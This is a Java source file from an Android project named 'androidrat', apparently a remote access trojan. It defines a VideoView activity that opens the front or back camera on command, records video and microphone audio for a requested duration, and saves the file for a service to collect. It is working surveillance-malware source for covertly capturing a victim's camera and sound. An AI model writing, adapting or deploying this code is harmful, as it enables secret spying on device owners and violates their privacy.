package com.ot.androidrat;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.Window;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.io.File;
import java.io.IOException;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class VideoView extends Activity implements  SurfaceHolder.Callback {

    MediaRecorder recorder;
    SurfaceHolder holder = null;
    boolean recording = false;
    @SuppressLint("SimpleDateFormat")
    String filename = new SimpleDateFormat("yyyy_MM_dd_HH_mm").format(new Date()) + ".mp4";
    File directory = new File(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos");

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        recorder = new MediaRecorder();
        try {
            initRecorder();
        } catch (IOException e) {
            e.printStackTrace();
        }
        setContentView(R.layout.video_view);
        SurfaceView cameraView = findViewById(R.id.surface_camera);
        holder = cameraView.getHolder();
        holder.addCallback(this);
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
    }

    private void initRecorder() throws UnknownHostException, IOException {
        directory.mkdirs();
        File outputFile = new File(directory, filename);

        Intent sender = getIntent();
        String cameraNumber = sender.getExtras().getString("Camera");
        String time = sender.getExtras().getString("Time");
        Camera camera = Camera.open(Integer.parseInt(cameraNumber));

        int cameraCount = 0;
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        cameraCount = Camera.getNumberOfCameras();
        for ( int camIdx = 0; camIdx < cameraCount; camIdx++ ) {
            Camera.getCameraInfo( camIdx, cameraInfo );
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK && cameraNumber.equalsIgnoreCase("0")) {
                try {
                    camera = Camera.open( camIdx );
                } catch (RuntimeException ignored) {
                }
            }
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT && cameraNumber.equalsIgnoreCase("1")) {
                try {
                    camera = Camera.open( camIdx );
                } catch (RuntimeException ignored) {
                }
            }
        }

        CamcorderProfile cpHigh = null;
        if(Integer.parseInt(cameraNumber) == 0)
        {
            cpHigh = CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH); //if camera = 0
        }
        camera.unlock();

        recorder.setOrientationHint(270);

        recorder.setCamera(camera);
        recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
        recorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);

        if(Integer.parseInt(cameraNumber)==0)
        {
            recorder.setProfile(cpHigh);
        }

        if(Integer.parseInt(cameraNumber)==1)
        {
            recorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_LOW));
            recorder.setVideoFrameRate(7);
        }

        recorder.setOutputFile(outputFile.toString());

        recorder.setMaxDuration(Integer.parseInt(time));
        recorder.setMaxFileSize(100000000); //100 mb
    }

    private void prepareRecorder() throws IOException {
        recorder.setPreviewDisplay(holder.getSurface());
        try {
            recorder.prepare();
            recorder.start();
        } catch (IllegalStateException e) {
            e.printStackTrace();
            finish();
        }
    }

    @Override
    public void surfaceCreated(@NonNull SurfaceHolder surfaceHolder) {
        try {
            prepareRecorder();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void surfaceChanged(@NonNull SurfaceHolder surfaceHolder, int i, int i1, int i2) {

    }

    @Override
    public void surfaceDestroyed(@NonNull SurfaceHolder surfaceHolder) {
        if (recording) {
            recorder.stop();
            recording = false;
        }
        recorder.release();
        // pass filename or bytes to MainService
        finish();
    }
}
